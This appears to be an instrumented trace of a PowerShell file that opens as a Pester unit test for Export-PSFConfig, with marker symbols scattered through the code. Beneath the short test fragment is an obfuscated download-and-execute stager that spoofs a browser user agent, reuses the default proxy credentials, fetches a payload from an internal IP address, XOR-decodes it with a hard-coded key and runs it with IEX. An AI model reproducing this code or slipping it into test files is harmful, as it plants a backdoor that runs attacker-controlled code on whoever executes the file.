 -||-> Describe "Export-PSFConfig Unit Tests" -Tag "CI", "Pipeline", "Unit" {
	 ...
	 -||-> Describe "Ensuring Module Cache functionality works as designed" {
		 ...
		 -||-> It "Should only export configuration settings marked for export in the module cache" {
			 ...
			 -||-> ( -||-> $items | Measure-Object <-||- ).Count | Should -Be 2 <-||-  
 ...
 -||-> $Wc= -||-> NeW-ObJecT SySTEm.NeT.WeBClIenT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $wC.HEAderS.AdD('User-Agent',$u) <-||- ; -||-> $wC.PRoXy = [SySTEM.Net.WEBREqUest]::DEfaUlTWEbPrOxy <-||- ; -||-> $WC.PROxy.CREDEnTIalS = [SySTEM.NeT.CREdeNTIalCacHE]::DefAuLTNeTWORKCREdENTiaLS <-||- ; -||-> $K='104d6d3521cc341013bc4d128e8c608f' <-||- ; -||-> $R=3 <-||- ;DO{ -||-> trY{ -||-> $I=0 <-||- ; -||-> [CHAR[]]$B= -||-> ( -||-> [CHAR[]]( -||-> $WC.DoWNLOadSTRiNg("http://192.168.30.136:801/index.asp") <-||- ) <-||- )|%{ -||-> $_-bXor$k[$i++%$K.LEnGth] <-||- } <-||-  <-||- ; -||-> IEX ( -||-> $b-joiN'' <-||- ) <-||- ;  -||-> $R=0 <-||- ;}cAtCh{ -||-> slEEp 5 <-||- ; -||-> $R-- <-||- } <-||- } whiLE ( -||-> $R -gt 0 <-||- )
